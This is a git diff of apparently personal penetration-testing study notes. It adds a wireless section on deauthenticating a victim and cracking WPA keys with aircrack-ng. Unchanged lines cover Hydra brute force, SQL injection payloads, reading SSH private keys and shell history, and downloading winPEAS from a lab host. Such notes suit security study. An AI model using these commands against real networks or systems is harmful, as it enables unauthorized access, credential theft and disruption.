@@ -1,7 +1,7 @@
 - [Net Sec](#net-sec)
   - [passive](#passive)
   - [active](#active)
-    - [Hydra](#hydra)
+  - [Hydra](#hydra)
   - [Shell](#shell)
     - [Priv Escalation](#priv-escalation)
       - [shared libraries](#shared-libraries)
@@ -12,7 +12,7 @@
 - [Getting file into target](#getting-file-into-target)
 - [Working with executables](#working-with-executables)
   - [finding them](#finding-them)
-- [browsing important files](#browsing-important-files)
+  - [browsing important files](#browsing-important-files)
 - [Metasploit with database](#metasploit-with-database)
   - [Meterpreter (payload)](#meterpreter-payload)
   - [Recoinaissance](#recoinaissance)
@@ -42,6 +42,12 @@
     - [Macros](#macros)
   - [Decoder, Comparer, Sequencer](#decoder-comparer-sequencer)
 - [Usefull Windows commands](#usefull-windows-commands)
+- [wireless](#wireless)
+  - [aircrack-ng tools](#aircrack-ng-tools)
+  - [steps](#steps-1)
+    - [getting packages](#getting-packages)
+    - [weak IV traffic](#weak-iv-traffic)
+    - [creating key](#creating-key)
 
 
 # Net Sec
@@ -59,7 +65,7 @@
 - searchsploit
   
 
-### Hydra
+## Hydra
 - hydra -l username -P wordlist.txt server service
 - hydra -l username -P wordlist.txt service://server
 - -d = debug
@@ -155,7 +161,7 @@
   - export -f /usr/sbin/service
   - /usr/local/bin/suid-env2
 
-# browsing important files  
+## browsing important files  
 - History
   - cat ~/.*history | less
   - .ssh Folder is always a must
@@ -201,7 +207,6 @@
   - -f[-f] => fragment
   - --reason / -v / -vv / -d / -dd
 
-
 - Output
   - -oN = normal output
   - -oG = grep output
@@ -216,7 +221,6 @@
  - Common services: http, ftp, smb, ssh, rdp
 
 # Basic Enum
-
 - enum4linux IP_
 - metasploit (smb/enum || ssh/enum)
 - gobuster / ffuf
@@ -229,9 +233,7 @@
 - PowerSploit (windows)
   - in the target 
 
-
 # Web hacking
-
 ## Subdomain
 - search certificates: 
   - https://transparencyreport.google.com/https/overview
@@ -243,13 +245,12 @@
 - dnsdumpster => online
 
 
- 
 ## Wildcards 
 - A lot of false positive
 - need to be filtered
-- 
 - dig domain.de A,CNAME {test321123,testingforwildcard,plsdontgimmearesult}.<domain> +short | wc -l ===> > 1, a lot of false positive from brute force
-  
+
+
 - OWAPS *Amass*: amass -src -ip -active -brute -d
   - https://github.com/OWASP/Amass/blob/master/doc/tutorial.md
   - amass -passive -d domain.de -src
@@ -282,7 +283,6 @@ Insecure Direct Object Request
   - /root/.ssh/id_rsa = private rsa key
   - /var/log/apache2/access.log
   - C:\boot.ini (windows)
-
 
 - null byte = %00, injection (terminate string)
 - curl -X METHOD -d [data]
@@ -319,9 +319,7 @@ Insecure Direct Object Request
   - enumerate username until valid one ==> NULL payload for password + several tries until get different response
   - try password with these usernames ==> grep warning for incorrect passwords
 
-
 ## database
-
 ### Steps
 - find vulnerability: ', "
 - find total columns: UNION SELECT NULL,NULL,NULL
@@ -434,9 +432,6 @@ Find content: '+UNION+SELECT+colum1,+column2,+FROM+discovered_table--
  - Cluster Bomb: several $payload$, one for the position_number, one for the string
  - Brute_force: iterate over given list
 
-
-
-
 - Known table, columns:
   - admin123' UNION SELECT 1,2,[sleep(5)] from *table_name* where *column* like '[character]%';--
   - admin123' UNION SELECT 1,2,[sleep(5)] from *table_name* where username='[name]' and password like 'a%';--
@@ -495,3 +490,39 @@ admin123' UNION SELECT SLEEP(5),2;--
 - powershell -c Invoke-Webrequest -OutFile winPeas.exe http://10.8.80.130/file.ext
 - powershell -c wget "http://10.8.80.130/Invoke-winPEAS.ps1" -outfile "winPEAS.ps1"
 
+# wireless
+- SSID: network name
+- BSSID: access point, MACO address
+- WPA2
+  - PSK = pre shared key = one password for everyone
+  - EAP = radius = username + password
+
+## aircrack-ng tools
+- airmon-ng = monitor interface
+  - airmon-ng start wlan0 = start monitoring
+    - stop connections
+- airmon-ng check = processes that may interfere with aircrack-ng
+  - airmon-ng check kill = kill all processes (no internet)
+  - Restore: 
+    - airmon-ng stop connection (mode)
+    - sudo service NetworkManager restart || sudo service network-manager restart || sudo service wpa_supplicant restart || sudo service dhclient restart
+## steps
+1 - kill process that can conflict = airmon-ng check kill
+2 - turn network card to monitor mode = airmon-ng start [network_name]
+3 - find AP around and capture traffic (also 4 handshake) = airodump [my_listener] --bsid [my_mac] --channel --write output
+4 - deauthenticate an user to force 4 handshae =  aireplay-ng --deauth 0 -a [my_mac] -c [victim] [network_name]
+5 - crack PSK - brute force = aircrak-ng -w [wordlist] -b [my_mac] [file.cap]
+
+### getting packages
+- airomon-ng start wlan0 = promiscuous mode interface to sniff wireles package (same channel)
+- airodump-ng network (wlan0monl) = sniff packages
+- airodump-ng wlan0mon --bssid [123] --channel [123] --write OUTPUT
+- 
+### weak IV traffic
+- 
+- fake authentication
+  - aireplay-ng --fakeauth 0 -a MAC wlan0mon -h MAC-host
+  - aireplay-ng --deauth 0 -e "name" wlan0mon
+  - 
+### creating key
+- 
